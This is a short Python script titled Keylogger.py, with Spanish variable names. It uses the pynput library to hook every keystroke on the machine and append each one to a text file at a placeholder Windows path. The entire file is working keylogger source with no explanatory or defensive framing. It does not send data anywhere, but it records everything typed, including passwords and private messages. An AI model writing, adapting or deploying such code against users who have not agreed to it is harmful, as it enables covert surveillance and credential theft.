#Keylogger.py


from pynput import keyboard as kb

lista_keylogger_pulsar=list()


def detect_k(key):
  archivo = open(r"C:\Ruta\del\Archivo\Keylogger.txt", "a")
  
  archivo.write(f"[+] Tecla pulsada -> {str(key)}\n")
  archivo.close()
  

kb.Listener(detect_k).run()
